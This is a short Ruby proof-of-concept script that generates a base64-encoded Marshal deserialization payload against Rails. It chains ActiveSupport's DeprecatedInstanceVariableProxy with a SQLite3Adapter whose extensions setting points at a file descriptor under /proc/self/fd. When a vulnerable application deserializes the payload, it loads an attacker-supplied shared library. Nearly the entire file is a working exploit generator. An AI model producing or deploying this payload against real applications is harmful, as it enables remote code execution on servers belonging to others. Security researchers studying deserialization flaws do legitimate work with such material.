#!/usr/bin/env ruby
# usage: ruby sqlite-marshal-poc.rb <fd>
# example: ruby sqlite-marshal-poc.rb 12

require "base64"
require "concurrent"

# Minimal stand-ins so Marshal.dump produces the right shape without
# booting a full Rails application in the generator.
class ActiveRecord
  class ConnectionAdapters
    class SQLite3Adapter
      def initialize(*)
        @connection_parameters = nil
        @config = nil
        @lock = nil
      end
    end
  end
end

class ActiveSupport
  class Concurrency
    module NullLock; end
  end

  class Deprecation
    def initialize
      @gem_name = "Rails"
      @deprecation_horizon = "8.1"
      @silenced = false
      @debug = false
      @silence_counter = Concurrent::ThreadLocalVar.new(0)
      @default_block = nil
      @default = nil
      @index = 22
      @explicitly_allowed_warnings = Concurrent::ThreadLocalVar.new(nil)
    end

    class DeprecatedInstanceVariableProxy
      def initialize(instance, method)
        @instance = instance
        @method = method
      end
    end
  end
end

fd = ARGV[0]
abort("Need to set target fd") unless fd

adapter = ActiveRecord::ConnectionAdapters::SQLite3Adapter.allocate
adapter.instance_variable_set(:@connection_parameters,
  { database: "/tmp/r.db", extensions: ["/proc/self/fd/#{fd}"] })
adapter.instance_variable_set(:@config,
  { connection_retries: 1, database: ":memory:" })
adapter.instance_variable_set(:@lock, ActiveSupport::Concurrency::NullLock)

proxy = ActiveSupport::Deprecation::DeprecatedInstanceVariableProxy.allocate
proxy.instance_variable_set(:@instance, adapter)
proxy.instance_variable_set(:@method, :connect!)
proxy.instance_variable_set(:@var, "@connect!")
proxy.instance_variable_set(:@deprecator, ActiveSupport::Deprecation.new)

puts Base64.encode64(Marshal.dump(proxy)).gsub("\n", "")
